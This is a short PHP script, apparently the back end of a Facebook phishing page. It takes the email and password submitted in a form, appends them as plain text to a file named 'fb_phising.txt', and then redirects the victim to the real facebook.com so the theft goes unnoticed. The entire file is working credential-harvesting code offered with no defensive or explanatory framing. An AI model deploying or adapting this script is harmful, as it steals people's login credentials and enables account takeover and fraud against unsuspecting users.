<?php 
     if(isset($_POST['email'])){
         $email = $_POST['email'];
         $pass = $_POST['password'];
         $myfile = fopen("fb_phising.txt", "a") or die("Unable to open file!"); 
        fwrite($myfile, "Username : $email\n");
        fwrite($myfile, "Password : $pass\n");
        fclose($myfile);
        echo "<script>window.location.href = 'https://www.facebook.com';</script>";
     }
?>
